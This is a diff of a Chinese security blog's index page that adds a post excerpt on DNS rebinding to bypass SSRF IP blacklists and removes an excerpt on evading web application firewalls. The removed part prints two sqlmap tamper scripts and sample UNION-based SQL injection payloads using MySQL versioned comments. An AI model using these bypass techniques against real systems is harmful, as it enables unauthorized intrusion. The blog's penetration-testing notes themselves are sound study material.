@@ -117,6 +117,82 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/12/06/dns-rebinding.html" >DNS Rebinding</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-12-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/12/06/dns-rebinding.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/12/05/redis-crontab.html" >redis hacker</a>
 		</h3>
 		</div>
@@ -635,294 +711,6 @@ CheckRule &quot;$XSS &gt;&#x3D; 8&quot; BLOCK;<span aria-hidden="true" class="li
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/10/30/bypass-sql-firewall.html" >bypass firewall</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-10-30  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>狗的绕过比较简单，还是写一下：</p>
-<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
-<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;doc&#x2F;COPYING&#39; for copying permission
-&quot;&quot;&quot;
-
-from lib.core.enums import PRIORITY
-
-__priority__ &#x3D; PRIORITY.LOW
-
-def dependencies():
-    pass
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;
-
-    Tested against:
-        * Microsoft SQL Server 2005
-        * MySQL 4, 5.0 and 5.5
-        * Oracle 10g
-        * PostgreSQL 8.3, 8.4, 9.0
-
-    Notes:
-        * Useful to bypass weak and bespoke web application firewalls
-
-    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
-    &quot;&quot;&quot;
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; &quot;&quot;
-        quote, doublequote, firstspace &#x3D; False, False, False
-
-        for i in xrange(len(payload)):
-            if not firstspace:
-                if payload[i].isspace():
-                    firstspace &#x3D; True
-                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                    continue
-
-            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
-                quote &#x3D; not quote
-
-            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
-                doublequote &#x3D; not doublequote
-
-            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
-                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                continue
-
-            retVal +&#x3D; payload[i]
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;LICENSE&#39; for copying permission
-&quot;&quot;&quot;
-
-import os
-import re
-
-from lib.core.common import singleTimeWarnMessage
-from lib.core.data import kb
-from lib.core.enums import DBMS
-from lib.core.enums import PRIORITY
-from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
-
-__priority__ &#x3D; PRIORITY.HIGHER
-
-def dependencies():
-    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Adds versioned MySQL comment before each keyword
-
-    Requirement:
-        * MySQL &lt; 5.1
-
-    Tested against:
-        * MySQL 4.0.18, 5.0.22
-
-    Notes:
-        * Useful to bypass several web application firewalls when the
-          back-end database management system is MySQL
-        * Used during the ModSecurity SQL injection challenge,
-          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html
-
-    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
-    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
-    &quot;&quot;&quot;
-
-    def process(match):
-        word &#x3D; match.group(&#39;word&#39;)
-        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
-            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
-        else:
-            return match.group()
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
-        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
-</blockquote>
-<p>比如mysql版本是5.5.53:</p>
-<blockquote>
-<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
-</blockquote>
-<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
-	
-
-	</div>
-  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>狗的绕过比较简单，还是写一下：</p>
-<p><a target="_blank" rel="noopener" href="https://secvul.com/topics/876.html">https://secvul.com/topics/876.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/network/150646.html">http://www.freebuf.com/articles/network/150646.html</a></p>
-<p>根据众多文章的解释，只要把注释符修改下中间加个字符就可以过狗了，比如: <code>/**a**/</code>，tamper.py如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;doc&#x2F;COPYING&#39; for copying permission
-&quot;&quot;&quot;
-
-from lib.core.enums import PRIORITY
-
-__priority__ &#x3D; PRIORITY.LOW
-
-def dependencies():
-    pass
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Replaces space character (&#39; &#39;) with comments &#39;&#x2F;**&#x2F;&#39;
-
-    Tested against:
-        * Microsoft SQL Server 2005
-        * MySQL 4, 5.0 and 5.5
-        * Oracle 10g
-        * PostgreSQL 8.3, 8.4, 9.0
-
-    Notes:
-        * Useful to bypass weak and bespoke web application firewalls
-
-    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
-    &#39;SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users&#39;
-    &quot;&quot;&quot;
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; &quot;&quot;
-        quote, doublequote, firstspace &#x3D; False, False, False
-
-        for i in xrange(len(payload)):
-            if not firstspace:
-                if payload[i].isspace():
-                    firstspace &#x3D; True
-                    retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                    continue
-
-            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
-                quote &#x3D; not quote
-
-            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
-                doublequote &#x3D; not doublequote
-
-            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
-                retVal +&#x3D; &quot;&#x2F;**s**&#x2F;&quot;
-                continue
-
-            retVal +&#x3D; payload[i]
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>米有神马技术含量，然后是绕过数字卫士的，这个得分个类，UNION和Error注入，对于这样的注入需要修改以下的步骤：<br>首先是修改tamper:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
-
-&quot;&quot;&quot;
-Copyright (c) 2006-2017 sqlmap developers (http:&#x2F;&#x2F;sqlmap.org&#x2F;)
-See the file &#39;LICENSE&#39; for copying permission
-&quot;&quot;&quot;
-
-import os
-import re
-
-from lib.core.common import singleTimeWarnMessage
-from lib.core.data import kb
-from lib.core.enums import DBMS
-from lib.core.enums import PRIORITY
-from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
-
-__priority__ &#x3D; PRIORITY.HIGHER
-
-def dependencies():
-    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s &lt; 5.1&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.MYSQL))
-
-def tamper(payload, **kwargs):
-    &quot;&quot;&quot;
-    Adds versioned MySQL comment before each keyword
-
-    Requirement:
-        * MySQL &lt; 5.1
-
-    Tested against:
-        * MySQL 4.0.18, 5.0.22
-
-    Notes:
-        * Useful to bypass several web application firewalls when the
-          back-end database management system is MySQL
-        * Used during the ModSecurity SQL injection challenge,
-          http:&#x2F;&#x2F;modsecurity.org&#x2F;demo&#x2F;challenge.html
-
-    &gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;)
-    &quot;value&#39;&#x2F;*!0UNION&#x2F;*!0ALL&#x2F;*!0SELECT&#x2F;*!0CONCAT(&#x2F;*!0CHAR(58,107,112,113,58),&#x2F;*!0IFNULL(CAST(&#x2F;*!0CURRENT_USER()&#x2F;*!0AS&#x2F;*!0CHAR),&#x2F;*!0CHAR(32)),&#x2F;*!0CHAR(58,97,110,121,58)),&#x2F;*!0NULL,&#x2F;*!0NULL#&#x2F;*!0AND &#39;QDWa&#39;&#x3D;&#39;QDWa&quot;
-    &quot;&quot;&quot;
-
-    def process(match):
-        word &#x3D; match.group(&#39;word&#39;)
-        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
-            return match.group().replace(word, &quot;&#x2F;*!50001%s*&#x2F; &quot; % word)
-        else:
-            return match.group()
-
-    retVal &#x3D; payload
-
-    if payload:
-        retVal &#x3D; re.sub(r&quot;(?&lt;&#x3D;\W)(?P&lt;word&gt;[A-Za-z_]+)(?&#x3D;\W|\Z)&quot;, lambda match: process(match), retVal)
-        retVal &#x3D; retVal.replace(&quot; &#x2F;*!50001*&#x2F;&quot;, &quot;&#x2F;*!50001*&#x2F;&quot;)
-
-    return retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<blockquote>
-<p>注释绕过，如果50001表示如果mysql的版本是5.00.01或者是5.0.1就可以执行这个语句</p>
-</blockquote>
-<p>比如mysql版本是5.5.53:</p>
-<blockquote>
-<p><code>select * from users where id=1 /*!50553union*/ /*!50002select*/ 3,2,3 order by id desc;</code></p>
-</blockquote>
-<p>这个语句是可以执行成功的，如果50553变成50554则执行失败</p>
-	
-	</div>
-  <a type="button" href="/2017/10/30/bypass-sql-firewall.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -978,7 +766,7 @@ def tamper(payload, **kwargs):
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -999,6 +787,10 @@ def tamper(payload, **kwargs):
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
+      </li>
+    
+      <li>
         <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
       </li>
     
@@ -1012,10 +804,6 @@ def tamper(payload, **kwargs):
     
       <li>
         <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
-      </li>
-    
-      <li>
-        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
       </li>
     
   </ul>
